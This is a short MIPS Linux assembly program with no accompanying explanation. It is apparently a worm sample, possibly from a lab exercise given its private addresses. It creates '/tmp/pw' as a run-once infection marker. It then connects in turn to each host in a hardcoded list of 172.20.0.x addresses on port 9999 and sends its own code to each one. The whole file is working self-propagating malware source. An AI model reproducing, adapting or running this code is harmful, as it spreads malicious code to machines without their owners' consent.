        .text
        .globl __start
__start:	
	#; Get pointer to data	
	#; J doesn't work is PC-region relative not PC-Relative
	bal 	data
start0:	
	move 	$t0, $ra
	
	#; Create file
	li 	$v0, 4005       # fd = open (fname, FLAGS)
	move 	$a0, $t0   	  # To be added later
	#; -----------------------------------------
	#; O_CREAT and O_EXCL are defined in /usr/mips...
	#; fcntl.h is first included that includes the bits/fcntl.h who
	#; defines O_CREAT and O_EXECL as 0x0100 and 0x0400
	#; -----------------------------------------
	li 	$a1, 0x0500
	li 	$a2, 0700
	syscall
	bgtz 	$a3, done      #; on Error $a3 = 1 (*man syscall for details)
	
	#; Close file
	move 	$a0, $v0
	li 	$v0, 4006
	syscall
	
	add 	$t0, $t0, 8    #; Point to ip_table
scan:	
	li 	$v0, 4183      #; socket
	li 	$a0, 2
	li 	$a1, 2         #; Also this contant is different
	li 	$a2, 6
	syscall
	
	move 	$a0, $v0 #; Set the socket as first parameter for all next calls

	li   	$v0, 4170      #; Connect
	move 	$a1, $t0
	li   	$a2, 16
	syscall
	bgtz 	$a3, next      #; on Error $a3 = 1
	
	# Copy
	li 	$v0, 4004      #; Write
	move 	$a1, $t1
	li 	$a2, code_size
	syscall

next:	
	# Close Socket
	li 	$v0, 4006
	syscall
	
	#; Are we done with our host list?
	add 	$t0, $t0, 8
	lw 	$t3, ($t0)
	beq 	$t3, $0, done
	nop
	b 	scan
done:
        # Exit
        li 	$v0, 4001
        syscall


.balign 16
data:
	nop
	add 	$t1, $ra, -8 # Store __start in $t1	
	bal 	start0
	
#; mark:  .ascii "/tmp/pw"
mark:	.quad 0x2f746d702f707700

ip_table:
	.quad 0x0002270fac140022
	.quad 0x0002270fac14002a
	.quad 0x0002270fac140003
	.quad 0x0002270fac14005b
	.quad 0x0002270fac14004c
	.quad 0x0002270fac140015
	.quad 0x00
end_code:	.equ	code_size, end_code - __start

